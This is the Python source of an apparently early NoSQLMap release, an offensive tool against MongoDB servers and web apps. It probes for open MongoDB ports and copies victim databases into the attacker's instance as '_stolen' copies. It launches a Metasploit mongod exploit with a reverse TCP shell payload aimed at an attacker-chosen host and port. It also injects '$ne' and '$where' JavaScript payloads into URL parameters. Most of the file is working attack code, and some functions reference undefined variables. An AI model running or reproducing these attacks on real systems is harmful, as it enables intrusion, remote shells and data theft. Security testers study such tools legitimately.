#!/usr/bin/python
#NoSQLMap Copyright 2013 Russell Butturini
#This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.


import sys
import string
import random
import os
import httplib2
import urllib
import pymongo
import subprocess
import options as optController
from exceptions import MetasploitException

#Set a list so we can track whether options are set or not to avoid resetting them in subsequent cals to the options menu.

options = optController.Options()

def mainMenu():
	select = True
	while select:
		os.system('clear')
		print "NoSQLMap v0.09-by Russell Butturini(tcstool@gmail.com)"
		print "\n"
		print "1-NoSQL DB Access Attacks"
		print "2-NoSQL Web App attacks"
		print "3-Exit"

		select = raw_input("Select an option:")

		if select == "1":
			#needed victim
				netAttacks(options.victim)

		elif select == "2":
			#needed victim and uri
				webApps()

		elif select == "3":
			sys.exit()

		else:
			raw_input("Invalid Selection.  Press enter to continue.")
			mainMenu()

def netAttacks(target):
	mgtOpen = False
	webOpen = False
	#This is a global for future use with other modules; may change
	global dbList

	#Check for default config
	try:
		conn = pymongo.MongoClient(target,27017)
		print "MongoDB port open on " + target + ":27017!"
		mgtOpen = True

	except:
		print "MongoDB port closed."


	mgtUrl = "http://" + target + ":28017"


	try:
		#Future rev:  Add web management interface parsing
		mgtRespCode = urllib.urlopen(mgtUrl).getcode()
		if mgtRespCode == 200:
			print "MongoDB web management open at " + mgtUrl + ".  Check this out!"

		else:
			print "Got HTTP " + mgtRespCode + "from " + mgtUrl + "."
	except:
		print "MongoDB web management closed."

	if mgtOpen == True:
		#This is compiling server info?????
		print "Server Info:"
		serverInfo = conn.server_info()
		print serverInfo

		print "\n"

		print "List of databases:"
		dbList = conn.database_names()
		print "\n".join(dbList)

		stealDB = raw_input("Steal a database? (Requires your own Mongo instance): ")

		if stealDB == "y" or stealDB == "Y":
			stealDBs (options.myIP)

		getShell = raw_input("Try to get a shell? (Requrires mongoDB <2.2.4)?")

		if getShell == "y" or getShell == "Y":
			if options.victim and options.myIP and options.myPort:
				#Launch Metasploit exploit
				launchMetasploitAttack()
			else:
				options.setVictim()
				options.setMyIP()
				options.setMyPort()
				launchMetasploitAttack()

	raw_input("Press enter to continue...")
	return()

def launchMetasploitAttack(type=0):
	'''launch metasploit attack, initially there is just one, maybe more added in the future'''
	typesAttack={
	0: subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(options.victim) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(options.myIP) + " LPORT="+ str(options.myPort) + " E", shell=True)
	}

	try:
		proc = typesAttack[0]
	except:
		raise MetasploitException("Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined.")
	if proc!=0:
		raise MetasploitException("Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined.")



def webApps():
	paramName = []
	paramValue = []
	vulnAddrs = []
	possAddrs = []

	#Verify app is working.
	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."

	appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)

	try:
		appRespCode = urllib.urlopen(appURL).getcode()
		if appRespCode == 200:
			normLength = int(len(urllib.urlopen(appURL).read()))

			print "App is up! Got response length of " + str(normLength) + ".  Starting injection test.\n"
			appUp = True

		else:
			print "Got " + appRespCode + "from the app, check your options."
	except:
		print "Looks like the server didn't respond.  Check your options."

	if appUp == True:

		injectSize = raw_input("Baseline test-Enter random string size: ")
		injectString = randInjString(int(injectSize))
		print "Using " + injectString + " for injection testing.\n"

		#Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
		#Add error handling for Non-200 HTTP response codes if random strings freaks out the app.
		randomUri = buildUri(appURL,injectString)
		print "Checking random injected parameter HTTP response size using " + randomUri +"...\n"
		randLength = int(len(urllib.urlopen(randomUri).read()))
		print "Got response length of " + str(randLength) + "."

		randNormDelta = abs(normLength - randLength)

		if randNormDelta == 0:
			print "No change in response size injecting a random parameter..\n"
		else:
			print "HTTP response varied " + str(randNormDelta) + " bytes with random parameter!\n"

		print "Testing Mongo PHP not equals associative array injection using " + neqUri +"..."
		injLen = int(len(urllib.urlopen(neqUri).read()))
		print "Got response length of " + str(injLen) + "."

		randInjDelta = abs(injLen - randLength)

		if (randInjDelta >= 100) and (injLen != 0) :
			print "Not equals injection response varied " + str(randInjDelta) + " bytes from random parameter! Injection works!"
			vulnAddrs.append(neqUri)

		elif (randInjDelta > 0) and (randInjDelta < 100) and (injLen != 0) :
			print "Response variance was only " + str(randInjDelta) + " bytes. Injection might have worked but difference is too small to be certain. "
			possAddrs.append(neqUri)

		elif (randInjDelta == 0):
			print "Random string response size and not equals injection were the same. Injection did not work."
		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
			possAddrs.append(neqUri)

		print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
		print " Injecting " + whereStrUri

		whereStrLen = int(len(urllib.urlopen(whereStrUri).read()))
		whereStrDelta = abs(whereStrLen - randLength)

		if (whereStrDelta >= 100) and (whereStrLen > 0):
			print "Java $where escape varied " + str(whereStrDelta)  + " bytes from random parameter! Where injection works!"
			vulnAddrs.append(whereStrUri)

		elif (whereStrDelta > 0) and (whereStrDelta < 100) and (whereStrLen - randLength > 0):
			print " response variance was only " + str(whereStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(whereStrUri)

		elif (whereStrDelta == 0):
			print "Random string response size and $where injection were the same. Injection did not work."

		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
			possAddrs.append(whereStrUri)

		print "\n"
		print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
		print " Injecting " + whereIntUri

		whereIntLen = int(len(urllib.urlopen(whereIntUri).read()))
		whereIntDelta = abs(whereIntLen - randLength)

		if (whereIntDelta >= 100) and (whereIntLen - randLength > 0):
			print "Java $where escape varied " + str(whereIntDelta)  + " bytes from random parameter! Where injection works!"
			vulnAddrs.append(whereIntUri)

		elif (whereIntDelta > 0) and (whereIntDelta < 100) and (whereIntLen - randLength > 0):
			print " response variance was only " + str(whereIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(whereIntUri)

		elif (whereIntDelta == 0):
			print "Random string response size and $where injection were the same. Injection did not work."

		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
			possAddrs.append(whereIntUri)

		#Start a single record attack in case the app expects only one record back

		print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
		print " Injecting " + whereOneStr


		whereOneStrLen = int(len(urllib.urlopen(whereOneStr).read()))
		whereOneStrDelta = abs(whereOneStrLen - randLength)

		if (whereOneStrDelta >= 100) and (whereOneStrLen - randLength > 0):
			print "Java $where escape varied " + str(whereOneStrDelta)  + " bytes from random parameter! Where injection works!"
			vulnAddrs.append(whereOneStr)

		elif (whereOneStrDelta > 0) and (whereOneStrDelta < 100) and (whereOneStrLen - randLength > 0):
			print " response variance was only " + str(whereOneStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(whereOneStr)

		elif (whereOneStrDelta == 0):
			print "Random string response size and $where single injection were the same. Injection did not work."

		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
			possAddrs.append(whereOneStr)

		print "\n"
		print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
		print " Injecting " + whereOneInt


		whereOneIntLen = int(len(urllib.urlopen(whereOneInt).read()))
		whereOneIntDelta = abs(whereIntLen - randLength)

		if (whereOneIntDelta >= 100) and (whereOneIntLen - randLength > 0):
			print "Java $where escape varied " + str(whereOneIntDelta)  + " bytes from random parameter! Where injection works!"
			vulnAddrs.append(whereOneInt)

		elif (whereOneIntDelta > 0) and (whereOneIntDelta < 100) and (whereOneIntLen - randLength > 0):
			print " response variance was only " + str(whereOneIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(whereOneInt)

		elif (whereOneIntDelta == 0):
			print "Random string response size and $where single record injection were the same. Injection did not work."

		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
			possAddrs.append(whereOneInt)

		print "\n"
		print "Vunerable URLs:"
		print "\n".join(vulnAddrs)
		print "\n"
		print ""
		print "Possibly vulnerable URLS:"
		print"\n".join(possAddrs)

	raw_input("Press enter to continue...")
	return()

def randInjString(size):
	#add more specific params (such as only letters, only numbers, etc.)
	chars = string.ascii_letters + string.digits
	return ''.join(random.choice(chars) for x in range(size))

def buildUri(origUri, randValue):
	paramName = []
	paramValue = []
	global neqUri
	global whereStrUri
	global whereIntUri
	global whereOneStr
	global whereOneInt

	#Split the string between the path and parameters, and then split each parameter
	split_uri = origUri.split("?")
	params = split_uri[1].split("&")

	for item in params:
		index = item.find("=")
		paramName.append(item[0:index])
		paramValue.append(item[index + 1:len(item)])
	print "List of parameters:"
	print "\n".join(paramName)

	injOpt = raw_input("Which parameter should we inject?")
	evilUri = split_uri[0] + "?"
	neqUri = split_uri[0] + "?"
	whereStrUri = split_uri[0] + "?"
	whereIntUri = split_uri[0] + "?"
	whereOneStr = split_uri[0] + "?"
	whereOneInt = split_uri[0] + "?"
	x = 0

	for item in paramName:
		if paramName[x] == injOpt:
			evilUri += paramName[x] + "=" + randValue + "&"
			neqUri += paramName[x] + "[$ne]=" + randValue + "&"
			whereStrUri += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
			whereIntUri += paramName[x] + "=a; return db.a.find(); var dummy=1" + "&"
			whereOneStr += paramName[x] + "=a'; return db.a.findOne(); var dummy='!" + "&"
			whereOneInt += paramName[x] + "=a; return db.a.findOne(); var dummy=1" + "&"
		else:
			evilUri += paramName[x] + "=" + paramValue[x] + "&"
			neqUri += paramName[x] + "=" + paramValue[x] + "&"
			whereStrUri += paramName[x] + "=" + paramValue[x] + "&"
			whereIntUri += paramName[x] + "=" + paramValue[x] + "&"
			whereOneStr += paramName[x] + "=" + paramValue[x] + "&"
			whereOneInt += paramName[x] + "=" + paramValue[x] + "&"

		x += 1
	#Clip the extra & off the end of the URL
	evilUri = evilUri[:-1]
	neqUri = neqUri[:-1]
	whereStrUri = whereStrUri[:-1]
	whereIntUri = whereIntUri[:-1]
	whereOneStr = whereOneStr[:-1]
	whereOneInt = whereOneInt[:-1]

	return evilUri

def stealDBs(myDB):
	menuItem = 1

	for dbName in dbList:
		print str(menuItem) + "-" + dbName
		menuItem += 1

	try:
		dbLoot = raw_input("Select a database to steal:")

	except:
		print "Invalid selection."
		stealDBs(myDB)

	try:
		#Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
		myDBConn = pymongo.MongoClient(myDB,27017)
		myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)
		cloneAnother = raw_input("Database cloned.  Copy another?")

		if cloneAnother == "y" or cloneAnother == "Y":
			stealDBs(myDB)

		else:
			return()

	except:
		raw_input ("Something went wrong.  Are you sure your MongoDB is running and options are set? Press enter to return...")
		mainMenu()

mainMenu()
